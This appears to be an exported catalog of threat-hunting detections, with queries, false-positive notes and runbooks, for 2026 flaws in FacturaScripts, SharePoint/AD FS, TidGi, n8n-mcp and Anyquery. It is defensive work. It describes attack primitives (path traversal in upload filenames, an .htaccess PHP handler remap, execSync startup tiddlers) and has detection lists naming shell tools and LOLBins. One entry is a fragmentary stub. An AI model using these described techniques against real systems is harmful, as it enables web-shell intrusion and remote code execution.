FacturaScripts upload endpoint: path-traversal sequence in multipart filename AIExploitation Medium
Hunts authenticated POSTs to FacturaScripts /api/3/uploadfiles or /api/3/attachedfiles where the request carries directory-traversal sequences (../, ..%2f, ..%5c) — the article's exact primitive for escaping MyFiles/ via the unsanitized getClientOriginalName() filename. Article-specific because legitimate FacturaScripts uploads never contain traversal syntax in the client filename. Rationale: Uses the article's named sinks (/api/3/uploadfiles, /api/3/attachedfiles) plus the ../ traversal signature that escapes MyFiles/. Note the traversal lives in the multipart Content-Disposition filename, not the URL — reliable only where a WAF/proxy inspects the body (CommonSecurityLog) or access logs capture request bodies; hence the companion file-write UCs. Defender XDR has no web-access-log table, so defender_kql is intentionally empty. Cross-checked against: • https://github.com/advisories/GHSA-hgjx-r89m-m7v4 • https://advisories.gitlab.com/composer/facturascripts/facturascripts/CVE-2026-27891/ • https://github.com/advisories/GHSA-vf3q-frmr-vrr9
ATT&CKT1190
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Vulnerability scanner (Nessus/Burp/Acunetix) probing the FacturaScripts upload endpoints with traversal payloads
  • Authorized pentest engagement replaying this exact GHSA PoC
  • WAF false-positive matching literal '..' in a benign filename such as 'report..final.pdf'
  • Backup/sync tooling posting archive paths containing relative segments
Suppression filter
| where user!="" and NOT match(coalesce(http_user_agent,""),"(?i)(nessus|acunetix|nuclei|burp|zgrab|nmap)")
Response runbook
1) Triage: pull the full request for the alerting SourceIP — confirm the multipart filename contains ../ and identify the authenticated user/API token; check the HTTP response code (2xx = write likely succeeded). 2) Contain: revoke the offending API token/session and block the SourceIP at the WAF; snapshot Dinamic/Assets/ and node_modules/ for forensics before cleanup. 3) Hunt: pivot to the file-write and .htaccess-chain UCs on the same host/time window; enumerate any .php/.phtml/.htaccess written under Dinamic/Assets or node_modules and any subsequent GET to those paths returning PHP-executed output.

FacturaScripts: PHP/.htaccess web-shell written into web-served Dinamic/Assets or node_modules AIInstallation High
Hunts the file-write outcome of the traversal: the web-server user creating a PHP-family file or an .htaccess override inside Dinamic/Assets/ or node_modules/ — the two directories the shipped htaccess-sample excludes from index.php rewriting, so Apache serves them directly. These paths should never receive attacker-controlled executable content in normal operation. Rationale: Anchors on the article's exact web-served directories (Dinamic/Assets, node_modules) combined with the BLOCKED_EXTENSIONS-bypassing extensions (.htaccess plus php-family) and a web-server initiating process. A PHP or .htaccess file appearing in these asset dirs written by httpd/php/nginx is the traversal primitive landing on disk. Cross-checked against: • https://github.com/advisories/GHSA-hgjx-r89m-m7v4 • https://advisories.gitlab.com/composer/facturascripts/facturascripts/CVE-2026-27891/
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate FacturaScripts plugin install/update writing bundled PHP assets into Dinamic/
  • npm install/build repopulating node_modules with vendored .php or .htaccess sample files
  • Deployment/CI pipeline syncing application code into the web root
  • Developer manually copying a debugging PHP file into an assets folder
Suppression filter
| where not (InitiatingProcessFileName in~ ("node.exe","npm.exe","git.exe","msiexec.exe") or InitiatingProcessCommandLine has_any ("npm install","composer install","git checkout"))
Response runbook
1) Triage: open the written file's content and hash (SHA256) — confirm it is PHP code or an AddType/AddHandler .htaccess rather than a benign asset; note the InitiatingProcess and account. 2) Contain: quarantine/delete the file, take the web app offline or drop a Deny-from-all rule over Dinamic/Assets, and rotate the web-server user's credentials/API tokens. 3) Hunt: correlate with the upload-endpoint UC for the originating request, look for a second dropped payload plus subsequent inbound GETs to the file path, and scan the whole web root for other newly-created php/htaccess files by the same process.

FacturaScripts RCE chain: .htaccess handler-remap override plus payload drop in same asset dir AIExploitation High
Detects the article's Step-3 code-execution chain on the endpoint: an attacker-written .htaccess (remapping a benign extension to the PHP handler) landing in Dinamic/Assets or node_modules, immediately followed by a second file (the payload) in the same web-served directory. The .htaccess override in these Apache-direct-served folders is essentially never legitimate and is the linchpin that turns arbitrary write into RCE. Rationale: Chains the two writes the advisory's Step 3 spells out (upload .htaccess with AddType application/x-httpd-php, then upload x.png payload) into a single temporal correlation within a web-served asset dir — far higher fidelity than either write alone. The Falcon variant isolates the .htaccess override linchpin that uniquely enables the extension remap. Cross-checked against: • https://github.com/advisories/GHSA-hgjx-r89m-m7v4 • https://github.com/advisories/GHSA-vf3q-frmr-vrr9
ATT&CKT1190 T1505.003
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Application deployment that ships both an .htaccess and bundled assets into node_modules within the same window
  • FacturaScripts/plugin installer laying down a directory-level .htaccess alongside static files
  • CI artifact extraction writing an .htaccess and multiple assets together
  • Admin manually hardening an asset directory by dropping a Deny .htaccess next to existing files
Suppression filter
| where not (HtProc in~ ("node.exe","npm.exe","git.exe") or PayloadFile endswith ".map")
Response runbook
1) Triage: read the .htaccess contents (look for AddType/AddHandler/SetHandler mapping a non-PHP extension to php) and inspect the paired payload file for PHP code; capture the initiating web-server account. 2) Contain: delete both files, take the site offline or override the directory with Deny-from-all, and rotate the web-server user credentials and any upload-capable API tokens. 3) Hunt: review web logs for inbound GETs to the payload path (successful RCE trigger), check for outbound C2 from the web-server process, and sweep the entire document root for other .htaccess overrides written by the same process.

Exposure hunt: hosts still vulnerable to actively-exploited July 2026 zero-days (AD FS CVE-2026-56155 / SharePoint CVE-2026-56164) AIExploitation High
Surfaces every managed asset whose vulnerability inventory still lists the two July-2026 Patch Tuesday zero-days Microsoft flagged as exploited in the wild — the AD FS EoP (CVE-2026-56155) and the SharePoint Server missing-auth EoP (CVE-2026-56164). Article-specific because it pins on the exact CVE IDs Microsoft confirmed under active attack, letting the SOC prioritise emergency patching of AD FS and SharePoint farms over the other 568 fixes. Rationale: Pins on the two CVE IDs the article explicitly names as actively exploited (CVE-2026-56155 AD FS EoP, CVE-2026-56164 SharePoint EoP) — matched against Microsoft's own MDVM CVE catalog, so it is self-corroborating and hand-edit-free.
ATT&CKT1068 T1190
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A host was patched but TVM inventory hasn't re-scanned yet (stale RecommendedSecurityUpdate)
  • Out-of-band build number that Microsoft's detection logic flags conservatively
  • Decommissioned AD FS/SharePoint server still reporting old inventory
  • Third-party scanner mapping the CVE to an unaffected SKU
  • Air-gapped server where the July cumulative update was applied offline but not reflected in the feed
Response runbook
Step 1 (triage): confirm the asset is genuinely internet-reachable or business-critical (AD FS proxy, SharePoint front-end) and that the installed KB predates the July 2026 cumulative update. Step 2 (contain): apply the July CU immediately; for SharePoint, as an interim mitigation enable AMSI with Request Body Scan mode = Full per Microsoft guidance; for AD FS, restrict local logon and review admin group membership. Step 3 (hunt): on any host that was unpatched, pivot to UC2 (w3wp spawning shells) and review AD FS admin-role changes and new service accounts around the exposure window.

SharePoint IIS worker (w3wp.exe) spawning a command interpreter — post-exploitation of CVE-2026-56164 AIExploitation Medium
Detects a SharePoint application-pool worker process (w3wp.exe) spawning cmd/powershell/net/whoami and other interpreters — the classic hands-on-keyboard footprint after a SharePoint privilege-escalation/missing-auth exploit like the actively-exploited CVE-2026-56164. Article-specific because it targets the SharePoint zero-day Microsoft confirmed under attack this Patch Tuesday, scoping the parent to SharePoint app pools rather than generic IIS. Rationale: Scopes to the SharePoint zero-day (CVE-2026-56164) Microsoft confirmed as actively exploited by pivoting on the SharePoint app-pool worker (w3wp.exe with 'SharePoint' in its app-pool command line) spawning interpreters — a high-fidelity hands-on-keyboard signal not covered by the excluded Office-spawns-script rule.
ATT&CKT1190 T1505.003 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • SharePoint timer/health jobs invoking PowerShell for farm maintenance
  • Admin using stsadm/PowerShell SharePoint management shell under the app-pool identity during a change window
  • Monitoring agents (SCOM) shelling out from the IIS worker
  • Deployment automation running net.exe/whoami for post-deploy validation
  • Custom SharePoint solution legitimately shelling out (rare, should be baselined)
Suppression filter
| where not (ProcessCommandLine has_any ("stsadm","Microsoft.SharePoint.PowerShell","OWSTIMER") and AccountName endswith "$")
Response runbook
Step 1 (triage): inspect the child ProcessCommandLine for recon (whoami/net group), download cradles, or web-shell writes; confirm the w3wp identity and whether a change window is active. Step 2 (contain): isolate the SharePoint front-end, kill the offending process tree, and capture w3wp memory; verify the July CU / AMSI Full-body-scan mitigation is applied. Step 3 (hunt): search DeviceFileEvents for newly written .aspx/.ashx under the SharePoint LAYOUTS/TEMPLATE web-accessible paths, review IIS logs for the triggering request, and pivot on any accounts/keys created after the first shell.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where InitiatingProcessCommandLine has "SharePoint"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","mshta.exe","cscript.exe","wscript.exe","net.exe","net1.exe","whoami.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "\\w3wp.exe"
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\mshta.exe","\\cscript.exe","\\wscript.exe","\\net.exe","\\net1.exe","\\whoami.exe")
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

TidGi Desktop wiki worker spawning a command interpreter (TiddlyWiki startup-module RCE) AIExploitation High
Hunts the RCE payload of GHSA-9hc2-hjx8-q6pv: after a malicious TiddlyWiki repo is imported, an auto-registered `module-type: startup` tiddler executes `require('child_process').execSync(...)` inside the TidGi Node.js wiki-worker thread, spawning a shell/LOLBin. A knowledge-management wiki app spawning cmd/powershell is anomalous and directly evidences exploitation. Rationale: Anchors on the exact exploit mechanics from the advisory (startup-module auto-exec calling require('child_process').execSync inside the TidGi wiki-worker) — a wiki app parenting cmd/powershell/LOLBins is high-fidelity. Cross-checked DeepWiki (worker-thread architecture runs in-process, so InitiatingProcess=TidGi.exe) and MITRE T1218.015. Cross-checked against: • https://github.com/advisories/GHSA-9hc2-hjx8-q6pv • https://deepwiki.com/tiddly-gittly/TidGi-Desktop/3.1-wiki-worker-and-nodejs-tiddlywiki • https://attack.mitre.org/techniques/T1218/015/
ATT&CKT1203 T1059 T1218.015
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Wiki owner running their own PoC/security test of the advisory
  • A legitimately-installed TiddlyWiki plugin that intentionally shells out to a system tool
  • TidGi feature that opens an external file/URL via a helper that transits cmd.exe
  • Unrelated node.exe located in a folder path coincidentally containing the string 'TidGi'
Suppression filter
| where not (FileName =~ "cmd.exe" and ProcessCommandLine has_any ("git ","--git-dir","rev-parse"))
Response runbook
1) Triage: pull the child ProcessCommandLine and TidGi's InitiatingProcessCommandLine; benign hits are usually git/backup helpers (excluded) — attacker payloads show execSync-style `cmd /c` with attacker commands. Identify the workspace folder and the most recently added tiddlers/*.js.tid file. 2) Contain: kill the TidGi and child process tree, isolate the host, and quarantine the imported wiki workspace directory to prevent re-boot re-execution. 3) Hunt: pivot on the host for follow-on child processes, outbound connections from TidGi.exe, and any git.exe clone that delivered the repo; check other users who imported the same repo/URL.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("TidGi.exe","node.exe")
| where InitiatingProcessFolderPath has "TidGi"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bitsadmin.exe","certutil.exe","curl.exe","calc.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName, FolderPath, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where (ParentProcessName endswith "\\TidGi.exe") or (ParentProcessName endswith "\\node.exe" and ParentProcessName has "TidGi")
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\wscript.exe","\\cscript.exe","\\mshta.exe","\\rundll32.exe","\\regsvr32.exe","\\bitsadmin.exe","\\certutil.exe","\\curl.exe","\\calc.exe")
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Malicious startup-module tiddler (.js.tid) written into a TiddlyWiki tiddlers/ directory AIDelivery Low
Hunts the delivery artifact of GHSA-9hc2-hjx8-q6pv: import of a malicious repo drops a JavaScript module tiddler (title like `$:/plugins/poc/startup.js` → file `$__plugins__poc__startup.js.tid`) into the wiki's `tiddlers/` directory, which TidGi auto-loads and registers as an executable module at boot. Surfaces newly written `.js.tid` module tiddlers for content triage (check for `module-type: startup`). Rationale: Uses the advisory's concrete on-disk artifact (tiddler title `$:/plugins/poc/startup.js` serialised as a `.js.tid` file under `tiddlers/`) and the git-clone/TidGi/node writer of the import. File telemetry can't see `module-type: startup` content, so this is a triage hunt — pair with UC1 for confirmation. Cross-checked against: • https://github.com/advisories/GHSA-9hc2-hjx8-q6pv • https://deepwiki.com/tiddly-gittly/TidGi-Desktop/3-wiki-management-system
ATT&CKT1204.002 T1059.007 T1195.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate TiddlyWiki plugins commonly ship JavaScript module tiddlers as .js.tid files
  • User cloning/opening their own trusted wiki repository
  • TidGi updating or re-syncing bundled plugin tiddlers
  • Developer authoring a legitimate JS widget/macro tiddler in their workspace
Response runbook
1) Triage: open the flagged .js.tid file and check the tiddler header for `module-type: startup` (or `module-type: filteroperator`/`macro`) and `type: application/javascript` with a `text` body calling require/child_process/exec — benign plugin tiddlers rarely do. Note the workspace and whether a git clone immediately preceded the write. 2) Contain: if the body invokes shell/`child_process`, quarantine the workspace directory before TidGi next boots it and isolate the host. 3) Hunt: correlate to UC1 (TidGi spawning a shell) on the same host/time; identify the source repo URL/folder and any other endpoints that imported it.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated"
| where FolderPath has "\\tiddlers\\"
| where FileName endswith ".js.tid"
| where InitiatingProcessFileName in~ ("git.exe","TidGi.exe","node.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where TargetFilePath has "\\tiddlers\\"
| where TargetFileName endswith ".js.tid"
| where ActingProcessName has_any ("git.exe","TidGi.exe","node.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath
| order by TimeGenerated desc

n8n-MCP cross-tenant workflow version read/enumeration via n8n_workflow_versions (CVE-2026-54052) AIReconnaissance Medium
Hunts high fan-out use of the n8n-mcp `n8n_workflow_versions` tool in list/rollback mode within a single host/session, the read path an authenticated tenant abuses to pull other tenants' un-isolated version snapshots (which embed node credential references and auth headers). Article-specific because it keys on the exact vulnerable MCP tool name and its read modes rather than generic API abuse. Rationale: Keys on the exact vulnerable tool name `n8n_workflow_versions` and its read modes (list/rollback) confirmed in n8n-mcp docs, plus the tenant_id session parameter used by multi-tenant HTTP mode; fan-out threshold turns legitimate single-workflow use into an enumeration signal. Splunk uses a raw app-log search because n8n-mcp stdout has no native CIM datamodel home. Cross-checked against: • https://github.com/czlonkowski/n8n-mcp • https://www.n8n-mcp.com/docs/workflow-management • https://docs.n8n.io/advanced-ai/mcp/mcp_tools_reference/
ATT&CKT1526 T1078 T1213
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate AI agent (Claude/Cursor/Windsurf) doing a bulk workflow audit or cleanup across many workflows in one session
  • Scheduled version-retention job iterating history to prune old snapshots
  • The one-time 2.56.1 upgrade migration touching all existing history
  • Platform admin performing a genuine multi-workflow restore/rollback
  • Monitoring/health-check that periodically lists versions
Suppression filter
| where ProcessName !has "migration" and Sample !has "retention" and Sample !has "scheduled-prune"
Response runbook
1) Triage: pull the offending host/session's raw n8n-mcp log lines; extract the acting tenant_id and the distinct workflow_ids/tenant_ids read — confirm whether the read tenant_id matches the owner tenant of each workflow. 2) Contain: if reads cross tenant boundaries, apply the advisory workaround immediately — set DISABLED_TOOLS=n8n_workflow_versions in the server env (Docker .env) and restart, or fail over each tenant to its own instance/DB; then upgrade to 2.56.1. 3) Hunt: for every foreign workflow_id touched, treat the embedded node credentials/auth headers as exposed — rotate them, and search the same logs for follow-on delete/prune/truncate (see companion UC).
Syslog
| where TimeGenerated > ago(7d)
| where SyslogMessage has "n8n_workflow_versions"
| where SyslogMessage has_any ('"mode":"list"','"mode":"rollback"','mode=list','mode=rollback')
| extend WorkflowId = extract(@'(?i)workflow[_\-]?id["'':=\s]+([A-Za-z0-9]{6,})', 1, SyslogMessage)
| extend TenantId  = extract(@'(?i)tenant[_\-]?id["'':=\s]+([A-Za-z0-9\-]{3,})', 1, SyslogMessage)
| summarize DistinctWorkflows = dcount(WorkflowId), Reads = count(), TenantIds = make_set(TenantId, 10), Sample = any(SyslogMessage), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by Computer, HostName, ProcessName, bin(TimeGenerated, 1h)
| where DistinctWorkflows > 20   // 20 = fan-out ceiling; a legit AI agent rarely reads >20 distinct workflow version histories per host/hour
| order by DistinctWorkflows desc
APPLICATION
index=* (sourcetype="n8n-mcp" OR sourcetype="n8n_mcp" OR source="*n8n-mcp*" OR source="*n8n_mcp*") "n8n_workflow_versions" ("\"mode\":\"list\"" OR "\"mode\":\"rollback\"" OR "mode=list" OR "mode=rollback")
| rex field=_raw "(?i)workflow[_\-]?id[\"':=\s]+(?<workflow_id>[A-Za-z0-9]{6,})"
| rex field=_raw "(?i)tenant[_\-]?id[\"':=\s]+(?<tenant_id>[A-Za-z0-9\-]{3,})"
| bin _time span=1h
| stats dc(workflow_id) as distinct_workflows count as reads values(tenant_id) as tenant_ids min(_time) as first_seen max(_time) as last_seen by host, _time
| where distinct_workflows > 20
| sort - distinct_workflows
n8n-MCP destructive workflow version backup deletion (delete/prune/truncate) — CVE-2026-54052 impact AIActions on Objectives Medium
Alerts on invocation of the n8n-mcp `n8n_workflow_versions` tool in delete/prune/truncate mode, the integrity/availability path an authenticated tenant abuses to destroy other tenants' un-isolated version backups. Article-specific: matches the exact tool name and its destructive modes rather than a generic file-delete pattern. Rationale: Matches the exact `n8n_workflow_versions` tool plus its three destructive modes (delete/prune/truncate confirmed in n8n-mcp docs) — the article explicitly states an authenticated tenant 'could delete or destroy other tenants' stored backups.' Destructive modes are rare enough to alert on; the query surfaces tenant_id/workflow_id so an analyst can immediately test cross-tenant ownership. Cross-checked against: • https://github.com/czlonkowski/n8n-mcp • https://www.n8n-mcp.com/docs/workflow-management
ATT&CKT1565.001 T1485
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate retention maintenance using prune/truncate (normal housekeeping modes)
  • The 2.56.1 upgrade migration which intentionally clears previously un-scoped backups
  • Admin manually rolling back a bad version then deleting it
  • CI/CD redeploy pipeline that resets workflow version history
Suppression filter
| where SyslogMessage !has "migration" and SyslogMessage !has "scheduled" and ProcessName !has "retention"
Response runbook
1) Triage: extract the acting tenant_id and target workflow_id from the log line; verify whether the deleting tenant owns that workflow — a mismatch is a confirmed cross-tenant destruction. 2) Contain: disable the tool now (DISABLED_TOOLS=n8n_workflow_versions), restart the server, and restore affected version history from DB/offsite backup; upgrade to 2.56.1. 3) Hunt: pivot on the same tenant_id for prior list/rollback reads (recon before destruction) and treat any node credentials in the destroyed/read snapshots as compromised — rotate them.
Syslog
| where TimeGenerated > ago(30d)
| where SyslogMessage has "n8n_workflow_versions"
| where SyslogMessage has_any ('"mode":"delete"','"mode":"prune"','"mode":"truncate"','mode=delete','mode=prune','mode=truncate')
| extend WorkflowId = extract(@'(?i)workflow[_\-]?id["'':=\s]+([A-Za-z0-9]{6,})', 1, SyslogMessage)
| extend TenantId  = extract(@'(?i)tenant[_\-]?id["'':=\s]+([A-Za-z0-9\-]{3,})', 1, SyslogMessage)
| project TimeGenerated, Computer, HostName, ProcessName, TenantId, WorkflowId, SyslogMessage
| order by TimeGenerated desc
title: n8n-MCP Destructive Workflow Version Backup Operation (CVE-2026-54052)
id: b3e1c7a2-4f8d-4a1e-9c3b-7d2e5f0a9c14
status: experimental
description: Detects invocation of the n8n-mcp n8n_workflow_versions tool in a destructive mode (delete/prune/truncate), the impact path of CVE-2026-54052 cross-tenant backup destruction in multi-tenant HTTP deployments.
references:
  - https://github.com/advisories/GHSA-j6r7-6fhx-77wx
author: SOC Detection Engineering
date: 2026/07/15
tags:
  - attack.impact
  - attack.t1565.001
  - attack.t1485
logsource:
  product: n8n_mcp
  service: application
detection:
  selection_tool:
    message|contains: 'n8n_workflow_versions'
  selection_mode:
    message|contains:
      - '"mode":"delete"'
      - '"mode":"prune"'
      - '"mode":"truncate"'
  condition: selection_tool and selection_mode
falsepositives:
  - Legitimate version-retention pruning
  - The 2.56.1 upgrade migration that clears un-scoped backups
level: high
APPLICATION
index=* (sourcetype="n8n-mcp" OR sourcetype="n8n_mcp" OR source="*n8n-mcp*" OR source="*n8n_mcp*") "n8n_workflow_versions" ("\"mode\":\"delete\"" OR "\"mode\":\"prune\"" OR "\"mode\":\"truncate\"" OR "mode=delete" OR "mode=prune" OR "mode=truncate")
| rex field=_raw "(?i)workflow[_\-]?id[\"':=\s]+(?<workflow_id>[A-Za-z0-9]{6,})"
| rex field=_raw "(?i)tenant[_\-]?id[\"':=\s]+(?<tenant_id>[A-Za-z0-9\-]{3,})"
| table _time, host, source, tenant_id, workflow_id, _raw
| sort - _time
n8n-MCP vulnerable multi-tenant config exposure (ENABLE_MULTI_TENANT without version-tool mitigation) AIExploitation Low
Config-audit hunt: flags n8n-mcp instances running in multi-tenant HTTP mode (ENABLE_MULTI_TENANT=true) where the n8n_workflow_versions tool is NOT disabled and the build is at or below the vulnerable 2.56.0 — the exact preconditions for CVE-2026-54052 cross-tenant access. Article-specific because it keys on the named env vars, tool name, and fixed version from the advisory. Rationale: Uses the three concrete advisory facts — env var `ENABLE_MULTI_TENANT=true`, the `DISABLED_TOOLS=n8n_workflow_versions` mitigation string, and the fixed version boundary 2.56.0/2.56.1 — to surface exploitable instances before abuse. Low confidence because it assumes the server emits config/version in its startup logs; pair with a config-inventory check where available. Cross-checked against: • https://github.com/czlonkowski/n8n-mcp • https://docs.n8n.io/advanced-ai/mcp/mcp_tools_reference/
ATT&CKT1190 T1078
Data sources
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Instance flagged multi-tenant but actually serving a single tenant (advisory says single-tenant HTTP is not affected)
  • Dev/test instance intentionally multi-tenant and not internet-exposed
  • Already-patched 2.56.1 host still echoing the env flag (version filter should exclude it, but startup log ordering may split the strings)
  • Instances where the version string isn't logged, causing an isnull() catch-all match
Suppression filter
| where SyslogMessage !has "single-tenant" and HostName !has "dev" and HostName !has "test" and HostName !has "staging"
Response runbook
1) Triage: confirm the flagged host is genuinely multi-tenant (>1 tenant/token served) and reachable by tenants — cross-check against the config-inventory/orchestration manifest. 2) Contain: for exposed vulnerable instances, apply a workaround now — set DISABLED_TOOLS=n8n_workflow_versions, or restrict the HTTP endpoint to trusted operators, then schedule the 2.56.1 upgrade (its migration isolates and clears un-scoped backups). 3) Hunt: on any instance that was vulnerable, replay the two companion detections (cross-tenant reads, destructive deletions) over the full exposure window to determine whether the gap was actually abused.
Syslog
| where TimeGenerated > ago(30d)
| where SyslogMessage has "n8n-mcp" or SyslogMessage has "n8n_mcp"
| where SyslogMessage has "ENABLE_MULTI_TENANT" and SyslogMessage has_any ("true","enabled")
| extend Version = extract(@'(?i)n8n[_\-]?mcp[^0-9]{0,20}v?(\d+\.\d+\.\d+)', 1, SyslogMessage)
| extend Mitigated = iif(SyslogMessage matches regex @'(?i)DISABLED_TOOLS\S*n8n_workflow_versions', true, false)
| extend Parts = split(Version, ".")
| extend VulnVersion = iif(isnotempty(Version) and (toint(Parts[0]) < 2 or (toint(Parts[0]) == 2 and (toint(Parts[1]) < 56 or (toint(Parts[1]) == 56 and toint(Parts[2]) <= 0)))), true, false)
| where Mitigated == false and (VulnVersion == true or isempty(Version))
| summarize Version = any(Version), Sample = any(SyslogMessage), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by Computer, HostName, ProcessName
| order by LastSeen desc
APPLICATION
index=* (sourcetype="n8n-mcp" OR sourcetype="n8n_mcp" OR source="*n8n-mcp*" OR source="*n8n_mcp*") "ENABLE_MULTI_TENANT" ("true" OR "enabled")
| rex field=_raw "(?i)n8n[_\-]?mcp[^0-9]{0,20}v?(?<ver>\d+\.\d+\.\d+)"
| eval mitigated=if(match(_raw,"(?i)DISABLED_TOOLS\S*n8n_workflow_versions"),1,0)
| eval vuln_version=if(isnotnull(ver) AND (tonumber(mvindex(split(ver,"."),0))<2 OR (tonumber(mvindex(split(ver,"."),0))==2 AND (tonumber(mvindex(split(ver,"."),1))<56 OR (tonumber(mvindex(split(ver,"."),1))==56 AND tonumber(mvindex(split(ver,"."),2))<=0)))),1,0)
| where mitigated=0 AND (vuln_version=1 OR isnull(ver))
| stats latest(ver) as version, latest(_raw) as sample, min(_time) as first_seen, max(_time) as last_seen by host, source
| sort - last_seen
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.

          VulnerabilitySeverityLevel, RecommendedSecurityUpdate

Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Anyquery server mode bound to all interfaces (exposed unauthenticated MySQL port) AIDelivery High
Hunts for the Anyquery binary launched in `server` mode with a wildcard bind (0.0.0.0), which exposes the unauthenticated MySQL-compatible port abused in CVE-2026-50006 for ATTACH DATABASE arbitrary file write. Surfaces the attack-surface exposure before any exploitation occurs. Rationale: Uses the article's exact invocation `anyquery server --host 0.0.0.0 --port 8070`; the combination of the named binary, the `server` subcommand and a wildcard bind is the precise exposure precondition for the CVE and is not a generic template. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx • https://github.com/julien040/anyquery/releases
ATT&CKT1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Data/analytics team legitimately running Anyquery server on an internal, network-segmented host
  • Container image that binds 0.0.0.0 by convention but is only reachable inside a private overlay network
  • Developer running `anyquery server` in a local test/CI environment
  • Reverse-proxy fronted deployment where 0.0.0.0 bind is intentional but auth is enforced upstream
Response runbook
1) Triage: confirm the Anyquery version (`anyquery --version`); anything < 0.4.5 is vulnerable. Check the bind address and whether the port is reachable from outside the host/subnet. 2) Contain: firewall the listener to localhost/trusted CIDRs or stop the service; upgrade to >= 0.4.5. 3) Hunt: on the same host review DeviceFileEvents for anyquery-initiated writes to /etc/cron.d, /var/www, /root/.ssh (see the AFW use case) and inbound connections from public IPs.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "anyquery"
| where ProcessCommandLine has "server"
| where ProcessCommandLine has_any ("--host 0.0.0.0", "--host=0.0.0.0", "-h 0.0.0.0", "0.0.0.0")

Inbound connection to Anyquery listener from a public IP AIDelivery Medium
Hunts for external (public-IP) network connections accepted by the Anyquery process, indicating an internet-reachable, unauthenticated MySQL-compatible endpoint is being reached by outside clients — the delivery vector for the CVE-2026-50006 ATTACH DATABASE write. Rationale: Ties the accepted inbound connection directly to the `anyquery` process (InitiatingProcess/ContextImageFileName) with a public remote peer, matching the article's 'unauthenticated attackers connecting to the MySQL-compatible server port'. Sentinel/Datadog left empty because inbound-accept events with process attribution are not present in the ASIM network or standard Datadog Linux schemas (explained per prompt guidance). Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
ATT&CKT1190 T1046
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate BI/reporting clients connecting to an intentionally public Anyquery endpoint
  • Cloud provider health-check probes hitting the exposed port
  • Internet-wide scanners (Shodan/Censys) touching the port without exploitation
  • VPN-exit / NAT gateway making internal client traffic appear as a single public IP
Response runbook
1) Triage: geolocate/reputation-check the RemoteIP and count distinct source IPs; a spray of unique public IPs suggests mass scanning. 2) Contain: restrict the listener to trusted source ranges and upgrade to Anyquery >= 0.4.5. 3) Hunt: for any RemoteIP of interest, pivot to DeviceFileEvents for anyquery writes to persistence paths and to DeviceProcessEvents for downstream cron/webshell reverse shells within the following minutes.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "anyquery"
| where ActionType == "InboundConnectionAccepted"
| where RemoteIPType == "Public"
| summarize Connections = count(), Ports = make_set(LocalPort, 10), First = min(Timestamp), Last = max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessCommandLine
| order by Connections desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceNetworkEvents
| where TimeGenerated > ago(7d)
| where InitiatingProcessFileName =~ "anyquery"
| where ActionType == "InboundConnectionAccepted"
| where RemoteIPType == "Public"
| summarize Connections = count(), Ports = make_set(LocalPort, 10), First = min(TimeGenerated), Last = max(TimeGenerated) by DeviceName, RemoteIP, InitiatingProcessCommandLine
| order by Connections desc
#event_simpleName=NetworkConnectIP4 ContextImageFileName=/anyquery$/i
| ConnectionDirection=1
| groupBy([aid, ComputerName, RemoteAddressIP4, RemotePort, LocalPort], function=count())
NETWORK
Toggle if your env has no CIM data-model acceleration.
